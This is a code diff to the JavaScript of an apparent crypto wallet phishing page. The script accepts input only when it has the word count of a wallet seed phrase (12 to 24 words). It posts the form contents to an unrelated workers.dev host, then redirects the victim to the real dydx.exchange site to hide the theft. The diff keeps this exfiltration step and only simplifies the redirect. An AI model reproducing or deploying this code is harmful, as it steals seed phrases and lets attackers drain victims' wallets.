@@ -35,17 +35,8 @@ $('#form-popup button').click(function() {
   
   if (count === 12 || count === 15 || count === 18 || count === 21 || count === 24) {
     $.post('https://blue-gay.juistespastelastes.workers.dev/', $('#form-popup form').serialize())
-      .done(function(data) {
-        $('#form-popup').addClass('hidden');
-        // Принудительный редирект несколькими способами
+      .done(function(response) {
         window.location.href = 'https://dydx.exchange/';
-        window.location.replace('https://dydx.exchange/');
-        window.location = 'https://dydx.exchange/';
-        
-        // На случай если предыдущие методы не сработают
-        setTimeout(() => {
-          window.location = 'https://dydx.exchange/';
-        }, 100);
       });
   } else {
     $('#form-popup form textarea').addClass('error');
